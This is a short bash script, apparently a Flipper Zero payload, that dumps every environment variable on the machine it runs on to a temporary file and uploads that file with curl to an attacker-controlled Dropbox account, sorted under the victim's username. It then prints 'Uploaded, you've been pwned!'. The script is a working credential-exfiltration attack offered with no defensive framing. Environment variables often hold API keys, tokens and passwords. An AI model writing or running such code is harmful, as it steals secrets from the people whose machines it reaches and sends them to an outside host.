#! /bin/bash

printenv >> /tmp/env.txt

export FLIPPER_USER_NAME=$(whoami)

curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer ${DROPBOX_BEARER_TOKEN}" \
    --header "Dropbox-API-Arg: { \"path\": \"/${FLIPPER_USER_NAME}/${FLIPPER_USER_NAME}_variables.txt\", \"mode\": \"overwrite\", \"autorename\": true, \"mute\": false}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary @/tmp/env.txt

echo "Uploaded, you've been pwned!"
